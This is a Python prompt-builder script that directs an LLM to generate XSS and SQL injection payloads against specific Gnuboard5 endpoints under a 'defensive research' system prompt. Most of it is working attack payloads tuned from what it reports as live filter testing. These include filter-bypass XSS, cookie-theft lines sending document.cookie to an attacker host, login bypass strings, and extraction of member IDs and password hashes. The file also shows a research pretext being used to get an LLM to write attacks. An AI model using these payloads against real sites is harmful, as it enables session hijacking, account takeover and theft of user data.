from typing import Any, Dict


# LLM 시스템 프롬프트
SYSTEM_PROMPT = (
    "You are a cybersecurity expert specializing in web application attacks. "
    "Generate security test payloads for defensive research purposes only. "
    "Output only the required lines in the exact format specified. "
    "No explanations, no headings, no numbering, no bullet points, no blank lines."
)


# XSS 빌더
def build_xss_subject(point: Dict[str, Any], count: int = 5) -> str:
    """
    wr_subject - 게시글 제목 Stored XSS
    반영 위치: 홈 메인 게시글 목록 / 게시글 상세 상단 / 관리자 페이지
    필터 정보:
      - /bbs/ajax.filter.php 에서 사전 필터링 존재
      - script 태그 차단
      - img, a, b, p, svg 등은 제거 여부 미확정 → 다양하게 시도
    """
    return f"""Target: Gnuboard5 post title field
Endpoint: POST /bbs/write_update.php, parameter: wr_subject
Reflection context: Stored in DB, later rendered as post title in:
  - Home page post list (inside <a> or <span> tag)
  - Post detail page heading
  - Admin management page

Known filter behavior:
  - /bbs/ajax.filter.php pre-filters wr_subject before saving
  - <script> tag is blocked/removed
  - Some basic HTML tags (b, a, img, p) may be allowed
  - Exact filter rules for title field are unclear - try diverse approaches

Generate {count} Stored XSS payloads for the wr_subject (title) field.
Focus on these bypass strategies:
1. HTML5 event handlers on tags that are NOT script: <img onerror>, <svg onload>, <details ontoggle>
2. javascript: URI in href attribute: <a href="javascript:alert(1)">x</a>
3. CSS-based: <style>*{"{"}color:red;animation-name:x{"}"}</style><p style="animation-name:x" onanimationstart=alert(1)>
4. Filter bypass with HTML entities: <img src=x onerror&#61;alert(1)>
5. Backtick function call (avoids parentheses if filtered): <img src=x onerror=alert`1`>
6. Short polyglot: <svg/onload=alert(1)>, <body onload=alert(1)>
7. Encoded tag names: <&#105;mg src=x onerror=alert(1)>
8. Attribute without quotes: <img src=x onerror=alert(1) x=>

Output format (one line per payload, no other text):
TYPE | PATTERN_FAMILY | PAYLOAD

Example:
STORED_XSS | img_onerror | <img src=x onerror=alert(1)>
STORED_XSS | svg_onload | <svg/onload=alert(1)>"""


def build_xss_content(point: Dict[str, Any], count: int = 5) -> str:
    """
    wr_content - 게시글 본문 Stored XSS
    HTML 옵션 활성화 시: b, a, img, p 태그 정상 렌더링
    script 태그: 차단
    목표: script 없이 이벤트핸들러 또는 허용된 태그로 JS 실행
    """
    return f"""Target: Gnuboard5 post content field (HTML enabled mode)
Endpoint: POST /bbs/write_update.php, parameter: wr_content
Reflection context: Stored HTML content rendered in post body

CONFIRMED filter behavior:
  - <script> tag: BLOCKED (not executed)
  - Allowed tags confirmed: <b>, <a>, <img>, <p>
  - /bbs/ajax.filter.php pre-filters before saving
  - Exact blocklist for other tags unknown

Goal: Execute JavaScript WITHOUT using <script> tag.
Leverage allowed tags and HTML5 features.

Generate {count} Stored XSS payloads for HTML content body.
Focus on these techniques:
1. Event handler on ALLOWED img tag: <img src=x onerror=alert(1)>
2. Event handler on ALLOWED a tag: <a href=javascript:alert(1)>click</a>
3. SVG tag (not in explicit blocklist): <svg/onload=alert(1)>
4. HTML5 interactive elements: <details open ontoggle=alert(1)>test</details>
5. Video/audio fallback: <video><source onerror=alert(1)></video>
6. Marquee animation: <marquee onstart=alert(1)>x</marquee>
7. Input autofocus: <input autofocus onfocus=alert(1)>
8. CSS animation trigger: <p style="animation-duration:1s;animation-name:x" onanimationstart=alert(1)>x</p>
9. iframe srcdoc: <iframe srcdoc="<script>alert(1)</script>">
10. Object tag: <object data=javascript:alert(1)>

For cookie exfiltration variants (replace alert(1) with):
  fetch('http://ATTACKER/?c='+document.cookie)
  new Image().src='http://ATTACKER/?c='+document.cookie

Output format (one line per payload, no other text):
TYPE | PATTERN_FAMILY | PAYLOAD

Example:
STORED_XSS | img_onerror | <img src=x onerror=alert(1)>
STORED_XSS | details_ontoggle | <details open ontoggle=alert(1)>x</details>"""


def build_xss_search(point: Dict[str, Any], count: int = 5) -> str:
    """
    stx - 검색창 Reflected XSS
    반영 위치: <input type="text" value="[HERE]"> 속성 내부
    실제 테스트 결과 기반 필터 정보 업데이트됨:
    - onmouseover=alert(1) → 통과 ✅
    - onfocus, onclick, onpointerover → 차단 ❌
    - &#61; (= entity) → 차단 ❌
    - "<img (태그 탈출) → < > HTML 인코딩됨, 탈출 불가 ❌
    search.php, qalist.php 모두 해당
    """
    return f"""Target: Gnuboard5 search field
Endpoint: GET /bbs/search.php?stx=[PAYLOAD] and GET /bbs/qalist.php?stx=[PAYLOAD]
Reflection context: Input value reflected inside HTML value attribute:
  <input type="text" name="stx" value="[REFLECTED HERE]">

CONFIRMED filter behavior from live testing:
  WORKING (payload reaches browser unfiltered):
    - " onmouseover=alert(1) x="  → SUCCESS, executes JS
    - " onmouseover=alert`1` x="  → SUCCESS, backtick call also works

  BLOCKED (filter removes or encodes these):
    - onfocus=       → stripped (entire onfocus handler removed)
    - onclick=       → stripped
    - onpointerover= → stripped
    - &#61; (HTML entity for =) → does NOT bypass filter, stripped
    - < and > characters → HTML-encoded (&lt; &gt;), tag breakout is IMPOSSIBLE

KEY INSIGHT:
  - The " character successfully breaks out of the value="" attribute
  - onmouseover= is NOT filtered, only certain event handlers are blocked
  - Tag breakout ("> then new tag) does NOT work because < > are encoded
  - Must stay WITHIN the attribute context: close quote, inject handler, re-open quote
  - Backtick syntax alert`1` works as alternative to alert(1)

Generate {count} Reflected XSS payloads that work within the attribute context.
DO NOT generate:
  - Tag breakout payloads ("><img, '><svg etc.) - < > are encoded, these FAIL
  - onfocus, onclick, onpointerover handlers - these are FILTERED
  - &#61; entity encoding for = - this is ALSO filtered

FOCUS on these working strategies:
1. Stay in attribute, use onmouseover (confirmed working):
   " onmouseover=alert(1) x="
   " onmouseover=alert`document.cookie` x="
2. Try other mouse/pointer events NOT in the blocklist:
   " onmouseenter=alert(1) x="
   " onmouseleave=alert(1) x="
   " onmousedown=alert(1) x="
   " onmouseup=alert(1) x="
3. Form/input events that may not be filtered:
   " oninput=alert(1) x="
   " onchange=alert(1) x="
   " onkeydown=alert(1) x="
4. Drag events:
   " ondragover=alert(1) x="
   " ondragstart=alert(1) x="
5. Cookie exfiltration via onmouseover (confirmed channel):
   " onmouseover=fetch('http://attacker/?c='+document.cookie) x="
   " onmouseover=new/**/Image().src='http://attacker/?c='+document.cookie x="

Output format (one line per payload, no other text):
TYPE | PATTERN_FAMILY | PAYLOAD

Example:
REFLECTED_XSS | onmouseover_alert | " onmouseover=alert(1) x="
REFLECTED_XSS | onmouseover_backtick | " onmouseover=alert`1` x="
REFLECTED_XSS | onmouseenter | " onmouseenter=alert(1) x="
REFLECTED_XSS | onkeydown | " onkeydown=alert(1) x=\""""


def build_xss_comment(point: Dict[str, Any], count: int = 5) -> str:
    """
    wr_content (댓글) - 댓글 본문 Stored XSS
    특이사항: http:// 형태 URL만 <a href>로 자동 변환됨
              javascript: URL → 링크 변환 안 됨 (일반 문자로 출력)
    """
    return f"""Target: Gnuboard5 comment content field
Endpoint: POST /bbs/write_comment_update.php, parameter: wr_content
Reflection context: Comment body, stored and rendered in post detail page

CONFIRMED filter behavior:
  - URLs starting with http:// or https:// followed by valid domain → auto-converted to <a href="...">
  - javascript:alert(1) → NOT converted to link, rendered as plain text
  - incomplete URLs → rendered as plain text
  - Script and other dangerous tags may be filtered

Strategy: The auto-link feature converts http:// URLs to <a href>
Can we inject into the URL itself? For example:
  - http://x.com" onmouseover="alert(1)
  - http://x.com/ onclick=alert(1)//
  If these get wrapped in <a href="http://x.com" onmouseover="alert(1)">, it works!

Generate {count} Stored XSS payloads for comment content.
Focus on:
1. Inject into auto-linked URL: http://x" onmouseover="alert(1)
2. Inject event into URL path: http://x.x/path onclick=alert(1)//
3. Malformed URL that still gets linkified with attribute injection
4. Direct HTML injection (if tags not fully filtered in comments)
5. CSS injection via style tags if allowed

Output format (one line per payload, no other text):
TYPE | PATTERN_FAMILY | PAYLOAD

Example:
STORED_XSS | url_attr_inject | http://x.x" onmouseover="alert(1)
STORED_XSS | img_onerror | <img src=x onerror=alert(1)>"""


# SQLi 빌더 - Gnuboard5 특화
def build_sqli_orderby(point: Dict[str, Any], count: int = 5) -> str:
    """
    sst / sod - ORDER BY Injection
    Gnuboard5의 sst(정렬 컬럼)와 sod(ASC/DESC)는
    SQL에 직접 연결됨: ORDER BY {sst} {sod}
    intval() 같은 정수 변환 없음, 문자열 필터만 존재
    """
    return f"""Target: Gnuboard5 sort parameters
Endpoint: GET {point.get('url')}, parameters: sst (sort column) and sod (sort order)
Injection context: Direct SQL ORDER BY concatenation (no parameterized query):
  SELECT ... FROM g5_write_free WHERE ... ORDER BY {{sst}} {{sod}}

This is an ORDER BY injection - no quotes surround the injected value.
sst examples: wr_datetime, wr_num, wr_hit
sod examples: ASC, DESC

Generate {count} ORDER BY injection payloads.
The payload is for the 'sst' or 'sod' parameter directly.

Attack techniques:
1. Time-based blind via SLEEP in ORDER BY:
   sst=(SELECT SLEEP(5))
   sst=wr_datetime,(SELECT SLEEP(5))
   sst=IF(1=1,SLEEP(5),wr_datetime)

2. Boolean-based via CASE WHEN in ORDER BY:
   sst=CASE WHEN (1=1) THEN wr_datetime ELSE wr_num END
   sst=CASE WHEN (ASCII(SUBSTRING(database(),1,1))>64) THEN wr_datetime ELSE wr_num END

3. Error-based in ORDER BY:
   sst=EXTRACTVALUE(1,CONCAT(0x7e,database()))
   sst=UPDATEXML(1,CONCAT(0x7e,user()),1)

4. UNION via ORDER BY column index with subquery:
   sst=(SELECT 1 FROM (SELECT SLEEP(3))x)

Note: ORDER BY does NOT allow UNION SELECT directly, but subqueries work.
Format sst values only (what goes after ORDER BY).

Output format (one line per payload, no other text):
TYPE | PATTERN_FAMILY | PAYLOAD

Example:
SQLI_ORDERBY | time_sleep | (SELECT SLEEP(5))
SQLI_ORDERBY | bool_case | CASE WHEN (1=1) THEN wr_datetime ELSE wr_num END
SQLI_ORDERBY | error_extractvalue | EXTRACTVALUE(1,CONCAT(0x7e,database()))"""


def build_sqli_field(point: Dict[str, Any], count: int = 5) -> str:
    """
    sfl - 검색 필드 선택자 SQLi
    Gnuboard5의 sfl 파라미터는 SQL WHERE 절에 직접 들어감:
    WHERE {sfl} LIKE '%{stx}%'
    값이 wr_subject, wr_content, mb_id 등이 기대되지만
    검증이 부족한 경우 SQL 구문 주입 가능

    실제 테스트 결과:
    - EXTRACTVALUE, UPDATEXML → 에러 없이 false_len 반환 (서버가 에러 숨김 또는 화이트리스트)
    - CASE WHEN 표현식 → false_len 반환 (컬럼명이 아닌 표현식은 Gnuboard5가 필터링 가능성)
    - sfl 화이트리스트: wr_subject, wr_content, wr_subject||wr_content 등 정상값만 허용 추정
    → 전략: 화이트리스트 우회 (정상값 뒤에 SQL 구문 이어붙이기)
    """
    return f"""Target: Gnuboard5 search field selector
Endpoint: GET {point.get('url')}, parameter: sfl (search field selector)
Injection context: Direct SQL WHERE clause field name injection:
  SELECT * FROM g5_write_free WHERE {{sfl}} LIKE '%keyword%' ORDER BY wr_datetime DESC

Normal values: wr_subject, wr_content, mb_id, wr_subject||wr_content
The sfl parameter is placed directly as a column/expression name in WHERE clause.
No quote marks surround the sfl value itself.

IMPORTANT - live test results:
  - Pure expressions (EXTRACTVALUE, CASE WHEN alone) return no signal
  - Server likely applies a soft whitelist, rejecting unknown expressions silently
  - STRATEGY: piggyback on a valid column name, append SQL after it
    e.g., sfl=wr_subject) AND (EXTRACTVALUE(1,CONCAT(0x7e,database()))-- -
    Result SQL: WHERE wr_subject) AND (EXTRACTVALUE(...)-- - LIKE '%keyword%'

Generate {count} SQLi payloads for the sfl (field selector) parameter.
Use VALID column names as prefix to pass the whitelist check, then inject after:

1. Error-based after valid column (close paren, inject, comment):
   wr_subject)AND(EXTRACTVALUE(1,CONCAT(0x7e,database())))-- -
   wr_subject)AND(UPDATEXML(1,CONCAT(0x7e,user()),1))-- -
   wr_subject)AND(EXTRACTVALUE(1,CONCAT(0x7e,version())))-- -

2. Time-based after valid column:
   wr_subject)AND(SLEEP(5))-- -
   wr_subject)AND(IF(1=1,SLEEP(5),0))-- -

3. Boolean blind after valid column:
   wr_subject)AND(1=1)-- -    <- TRUE baseline
   wr_subject)AND(1=2)-- -    <- FALSE baseline

4. Subquery error after valid column:
   wr_subject)AND(EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()))))-- -

Note: Try both with and without closing parenthesis before AND, depending on actual SQL structure.
Also try: wr_subject||wr_content as prefix (both columns concatenated).

Output format (one line per payload, no other text):
TYPE | PATTERN_FAMILY | PAYLOAD

Example:
SQLI_FIELD | piggyback_error | wr_subject)AND(EXTRACTVALUE(1,CONCAT(0x7e,database())))-- -
SQLI_FIELD | piggyback_sleep | wr_subject)AND(SLEEP(5))-- -
SQLI_FIELD | piggyback_true | wr_subject)AND(1=1)-- -"""


def build_sqli_string(point: Dict[str, Any], count: int = 5) -> str:
    """
    stx - 검색 키워드 SQLi (Gnuboard5 INSTR 컨텍스트)

    [실제 SQL 구조 - 브라우저 에러 메시지로 직접 확인]
    PHP가 stx를 공백으로 단어 분리 후 각 단어를 아래 형태로 래핑:
      WHERE ((INSTR(LOWER(wr_subject), LOWER('WORD1')))) AND ((INSTR(LOWER(wr_subject), LOWER('WORD2'))))

    CRITICAL CONSTRAINTS (위반 시 페이로드 무효):
    1. 페이로드에 공백 절대 금지 - 공백이 있으면 PHP가 단어분리하여 별도 INSTR 조건이 됨
    2. 주석은 # 사용 (-- 는 MySQL에서 뒤에 공백 필요 -> 공백 쓰면 단어분리 발생)
    3. 따옴표 닫은 뒤 괄호 4개 닫아야 함: a'))))
         '  -> LOWER()의 문자열 리터럴 닫기
         )  -> LOWER() 함수 닫기
         )  -> INSTR() 함수 닫기
         )) -> 외부 (( 래퍼 닫기
    4. 서브쿼리 내부 공백은 /**/ 로 대체
    5. SLEEP 계열은 SQL 에러가 먼저 발생하면 실행 안 됨 (에러기반 우선)
    6. LIMIT 절: LIMIT(n,m) 형태는 MySQL에서 지원 안 됨 → LIMIT/**/n,m 사용
    7. FROM 절: FROM(tablename) 형태 오류 → FROM/**/tablename 사용
    """
    return f"""Target: Gnuboard5 search keyword parameter
Endpoint: GET {point.get('url')}, parameter: {point.get('param', 'stx')}

ACTUAL SQL STRUCTURE (confirmed via MySQL error page):
  PHP splits stx by SPACES into words, each wrapped in this template:
    WHERE ((INSTR(LOWER(wr_subject), LOWER('WORD'))))

  For a single-word input the full WHERE clause is:
    WHERE ((INSTR(LOWER(wr_subject), LOWER('{{input}}'))))

CRITICAL CONSTRAINTS - violating any one will break the injection:
  1. ZERO spaces anywhere in the payload
       Reason: PHP does stx.split(' ') -> each word becomes its own INSTR condition
       If your payload has a space, it becomes TWO separate INSTR conditions -> SQL syntax error
  2. Use # as the comment terminator, NOT -- or -- -
       Reason: -- requires a trailing space in MySQL, but spaces are forbidden (rule 1)
  3. Must close FOUR parentheses after the injected quote:  a'))))
       '   closes the LOWER() string literal
       )   closes LOWER()
       )   closes INSTR()
       ))  closes the outer (( wrapper from the PHP template
  4. ALL spaces inside subqueries MUST be replaced with /**/
       CORRECT:   FROM/**/information_schema.tables
       WRONG:     FROM(information_schema.tables)   <- syntax error, DO NOT use
  5. LIMIT syntax: LIMIT is NOT a function, cannot use parentheses
       CORRECT:   LIMIT/**/0,1   or   LIMIT/**/1
       WRONG:     LIMIT(0,1)          <- syntax error, DO NOT use
  6. Error-based payloads fire before SLEEP() executes - prefer EXTRACTVALUE for data extraction

Escape/injection pattern:
  Input:   a'))))INJECTION_HERE#
  SQL:     WHERE ((INSTR(LOWER(wr_subject), LOWER('a'))))INJECTION_HERE#'))))
                                                          ^^^^^^^^^^^^^^^^ your code runs here
                                                                          ^ # comments out remaining '))))

Generate {count} SQLi payloads for this INSTR string context.
ALL payloads MUST:
  - Start with:  a'))))
  - End with:    #
  - Contain NO space characters (use /**/ inside subqueries instead)
  - Never use FROM(table) or LIMIT(n,m) syntax

Attack techniques to cover:

1. BOOLEAN TRUE / FALSE pair (baseline detection):
   a'))))OR(1=1)#          <- TRUE  - returns all rows
   a'))))AND(1=2)#         <- FALSE - returns zero rows

2. BOOLEAN with conditional subqueries (/**/ replaces every space):
   a'))))AND(LENGTH(database())>0)#
   a'))))AND(MID(database(),1,1)REGEXP(0x5e61))#       <- MID is alias for SUBSTRING, REGEXP avoids >
   a'))))AND((SELECT/**/1/**/FROM/**/information_schema.tables/**/LIMIT/**/1)=1)#

3. ERROR-BASED data extraction via EXTRACTVALUE (most reliable):
   a'))))AND(EXTRACTVALUE(1,CONCAT(0x7e,database())))#
   a'))))AND(EXTRACTVALUE(1,CONCAT(0x7e,version())))#
   a'))))AND(EXTRACTVALUE(1,CONCAT(0x7e,(SELECT/**/GROUP_CONCAT(table_name)/**/FROM/**/information_schema.tables/**/WHERE/**/table_schema=database()))))#
   a'))))AND(EXTRACTVALUE(1,CONCAT(0x7e,(SELECT/**/CONCAT(mb_id,0x3a,mb_password)/**/FROM/**/g5_member/**/LIMIT/**/1))))#
   a'))))AND(EXTRACTVALUE(1,CONCAT(0x7e,(SELECT/**/GROUP_CONCAT(column_name)/**/FROM/**/information_schema.columns/**/WHERE/**/table_name=0x67355f6d656d626572))))#

4. TIME-BASED blind via SLEEP (use only if no errors triggered):
   a'))))AND(SLEEP(5))#
   a'))))AND(IF(1=1,SLEEP(5),0))#

Output format (one line per payload, no other text):
TYPE | PATTERN_FAMILY | PAYLOAD

Example:
BOOLEAN | instr_true | a'))))OR(1=1)#
BOOLEAN | instr_false | a'))))AND(1=2)#
ERROR_BASED | extract_db | a'))))AND(EXTRACTVALUE(1,CONCAT(0x7e,database())))#
ERROR_BASED | extract_tables | a'))))AND(EXTRACTVALUE(1,CONCAT(0x7e,(SELECT/**/GROUP_CONCAT(table_name)/**/FROM/**/information_schema.tables/**/WHERE/**/table_schema=database()))))#
ERROR_BASED | extract_member | a'))))AND(EXTRACTVALUE(1,CONCAT(0x7e,(SELECT/**/CONCAT(mb_id,0x3a,mb_password)/**/FROM/**/g5_member/**/LIMIT/**/1))))#
TIME_BASED | instr_sleep | a'))))AND(SLEEP(5))#"""



def build_sqli_login(point: Dict[str, Any], count: int = 5) -> str:
    """
    mb_id / mb_password - 로그인 폼 SQLi
    POST /bbs/login_check.php
    쿼리 추정: SELECT * FROM g5_member WHERE mb_id='{mb_id}' AND mb_password=MD5('{mb_password}')
    """
    return f"""Target: Gnuboard5 login form
Endpoint: POST /bbs/login_check.php, parameters: mb_id, mb_password
Injection context: Login query (estimated):
  SELECT * FROM g5_member WHERE mb_id='{{mb_id}}' AND mb_password=MD5('{{mb_password}}')

The mb_id parameter is a string context with quotes.
Gnuboard5 applies addslashes() to input.

Generate {count} SQLi payloads targeting mb_id or mb_password.
Goal: bypass authentication or extract data.

Attack techniques:
1. Classic auth bypass (if quotes not properly escaped):
   mb_id: admin'-- -
   mb_id: ' OR '1'='1'-- -
   mb_id: admin' OR 1=1-- -

2. Password field bypass:
   mb_password: ' OR '1'='1
   mb_password: anything' OR 'x'='x

3. Time-based detection (no quote needed if numeric context):
   mb_id: 0 OR SLEEP(5)-- -
   mb_id: admin' AND SLEEP(5)-- -

4. Error-based:
   mb_id: ' AND EXTRACTVALUE(1,CONCAT(0x7e,database()))-- -
   mb_id: ' OR UPDATEXML(1,CONCAT(0x7e,user()),1)-- -

5. UNION-based (determine column count of member table):
   mb_id: ' UNION SELECT 1,2,3,4,5-- -

Output format (one line per payload, no other text):
TYPE | PATTERN_FAMILY | PAYLOAD

Example:
SQLI_LOGIN | auth_bypass | admin'-- -
SQLI_LOGIN | tautology | ' OR '1'='1'-- -
SQLI_LOGIN | time_sleep | ' AND SLEEP(5)-- -"""


# SQLi 빌더 - 일반형 (호환성 유지)
def build_sqli_error(point: Dict[str, Any], count: int = 5) -> str:
    return f"""Target SQL injection - Error-based
Endpoint: {point.get('method','GET')} {point.get('url')}, parameter: {point.get('param')}
DB: {point.get('db','MySQL')}
Context: Numeric parameter injected directly into WHERE clause.

Generate {count} Error-based SQL injection payloads.
Sub-techniques: EXTRACTVALUE, UPDATEXML, FLOOR+RAND, geometry error, GROUP BY error.

Output format: TYPE | PATTERN_FAMILY | PAYLOAD

Example:
ERROR_BASED | extractvalue_version | 0 OR EXTRACTVALUE(1,CONCAT(0x7e,version()))
ERROR_BASED | updatexml_database | 0 OR UPDATEXML(1,CONCAT(0x7e,database()),1)"""


def build_sqli_boolean(point: Dict[str, Any], count: int = 5) -> str:
    return f"""Target SQL injection - Boolean-based Blind
Endpoint: {point.get('method','GET')} {point.get('url')}, parameter: {point.get('param')}
DB: {point.get('db','MySQL')}

Generate {count} Boolean-based Blind payloads (True and False variants paired).
Sub-techniques: ASCII+SUBSTRING, LENGTH, CASE WHEN, EXISTS subquery.

Output format: TYPE | PATTERN_FAMILY | PAYLOAD

Example:
BOOLEAN | ascii_compare | 0 OR ASCII(SUBSTRING(database(),1,1))>64
BOOLEAN | length_check | 0 OR LENGTH(database())=6"""


def build_sqli_time(point: Dict[str, Any], count: int = 5) -> str:
    return f"""Target SQL injection - Time-based Blind
Endpoint: {point.get('method','GET')} {point.get('url')}, parameter: {point.get('param')}
DB: {point.get('db','MySQL')}

Generate {count} Time-based Blind payloads using SLEEP(5).
Sub-techniques: simple SLEEP, IF+SLEEP, CASE WHEN+SLEEP, nested EXISTS+SLEEP, BENCHMARK.

Output format: TYPE | PATTERN_FAMILY | PAYLOAD

Example:
TIME_BASED | simple_sleep | 0 OR SLEEP(5)
TIME_BASED | conditional_sleep | 0 OR IF(1=1,SLEEP(5),0)"""


def build_sqli_union(point: Dict[str, Any], columns: int = 3, count: int = 5) -> str:
    return f"""Target SQL injection - Union-based
Endpoint: {point.get('method','GET')} {point.get('url')}, parameter: {point.get('param')}
DB: {point.get('db','MySQL')}, estimated columns: {columns}

Generate {count} UNION-based payloads.
Sub-techniques: NULL probe, column count enum, version/database/table/column extraction.

Output format: TYPE | PATTERN_FAMILY | PAYLOAD

Example:
UNION | null_probe | 0 UNION SELECT NULL,NULL,NULL-- -
UNION | version_extract | 0 UNION SELECT version(),NULL,NULL-- -"""


def build_sqli_tautology(point: Dict[str, Any], count: int = 5) -> str:
    return f"""Target SQL injection - Tautology/Conditional/Exist
Endpoint: {point.get('method','GET')} {point.get('url')}, parameter: {point.get('param')}
DB: {point.get('db','MySQL')}

Generate {count} payloads per type: TAUTOLOGY, CONDITIONAL, EXIST-BASED, CONDITIONAL+TAUTOLOGY.
Total {count*4} payloads.

Output format: TYPE | PATTERN_FAMILY | PAYLOAD

Example:
TAUTOLOGY | numeric_basic | 0 OR (1=1)
CONDITIONAL | ascii_compare | 0 OR ASCII(SUBSTRING(database(),1,1))>64"""


#  Router

# 라우터 - vuln_type 문자열 → 빌더 함수 매핑
BUILDERS = {
    # XSS - 서버 분석 기반
    "xss_subject":     build_xss_subject,      # wr_subject: 제목 Stored XSS
    "xss_content":     build_xss_content,      # wr_content: 본문 HTML Stored XSS
    "xss_search":      build_xss_search,       # stx: value="" 속성 Reflected XSS
    "xss_comment":     build_xss_comment,      # 댓글 wr_content Stored XSS

    # SQLi - Gnuboard5 특화
    "sqli_orderby":    build_sqli_orderby,     # sst/sod: ORDER BY 주입
    "sqli_field":      build_sqli_field,       # sfl: 필드선택자 주입
    "sqli_string":     build_sqli_string,      # stx/sca: 문자열 컨텍스트
    "sqli_login":      build_sqli_login,       # mb_id/mb_password: 로그인 폼

    # SQLi - 일반형 (호환성)
    "sqli_error":      build_sqli_error,
    "sqli_boolean":    build_sqli_boolean,
    "sqli_time":       build_sqli_time,
    "sqli_union":      build_sqli_union,
    "sqli_tautology":  build_sqli_tautology,
}


def build_prompt(point: Dict[str, Any], vuln_type: str, **kwargs) -> str:
    builder = BUILDERS.get(vuln_type)
    if not builder:
        raise ValueError(
            f"Unsupported vuln_type: {vuln_type}\nAvailable: {list(BUILDERS)}"
        )
    return builder(point, **kwargs)


if __name__ == "__main__":
    sample_xss = {
        "url": "/bbs/write_update.php", "method": "POST",
        "param": "wr_subject", "type": "stored_xss",
    }
    sample_sqli = {
        "url": "/bbs/search.php", "method": "GET",
        "param": "sfl", "db": "MySQL",
    }

    for vtype, pt in [
        ("xss_subject", sample_xss),
        ("xss_search",  sample_xss),
        ("sqli_orderby", sample_sqli),
        ("sqli_field",   sample_sqli),
    ]:
        print(f"\n{'='*60}")
        print(f"  [{vtype}]")
        print('='*60)
        print(build_prompt(pt, vtype))
        print()
